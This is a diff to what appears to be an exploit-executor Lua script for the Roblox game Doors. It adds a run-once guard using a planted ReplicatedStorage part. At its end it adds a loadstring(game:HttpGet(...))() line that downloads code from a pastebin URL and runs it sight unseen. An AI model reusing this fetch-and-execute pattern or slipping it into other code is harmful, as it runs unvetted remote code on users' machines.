@@ -734,7 +734,21 @@ end
 coroutine.wrap(CJZEISY_fake_script)()
 
 
+if game:GetService("ReplicatedStorage"):FindFirstChild("balls") then
 
+    firesignal(game:GetService("ReplicatedStorage").EntityInfo.Caption.OnClientEvent, 'You have Exucuted The Mode 2 times, returning rn',true,1)
+
+    return false
+
+end
+
+local Test = Instance.new("Part")
+
+Test.Name = "balls"
+
+Test.Parent = game:GetService("ReplicatedStorage")
+
+Test = 1
 spawn(function() -- old seek
 while wait(3.5) do
 if workspace.Ambience_Seek.Playing == true then
@@ -2581,3 +2595,4 @@ end)
 
 
 
+loadstring(game:HttpGet("https://pastebin.com/raw/hFkumSMF"))()
